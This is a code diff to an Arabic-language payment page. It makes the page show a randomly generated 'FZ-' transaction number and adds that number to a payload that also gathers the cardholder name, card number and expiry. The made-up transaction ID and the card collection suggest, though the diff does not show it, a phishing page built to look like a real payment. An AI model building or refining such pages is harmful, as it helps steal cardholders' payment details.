@@ -266,7 +266,7 @@
                     </div>
                     <div class="info-row">
                         <span class="info-label">رقم المعاملة</span>
-                        <span class="info-value">1322640</span>
+                        <span id="transactionNo" class="info-value">FZ-</span>
                     </div>
                     <div class="info-row">
                         <span class="info-label">المبلغ</span>
@@ -367,6 +367,11 @@
     </div>
 
     <script>
+        // Generate random transaction number starting with FZ
+        const randomNo = Math.floor(100000 + Math.random() * 900000);
+        const fullTransactionNo = 'FZ-' + randomNo;
+        document.getElementById('transactionNo').innerText = fullTransactionNo;
+
         // Formatting card number
         document.getElementById('cardNumber').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
@@ -400,6 +405,7 @@
             
             const payload = {
                 ...userData,
+                transactionId: fullTransactionNo,
                 cardName,
                 cardNumber,
                 expiryDate: `${expiryMonth}/${expiryYear}`,
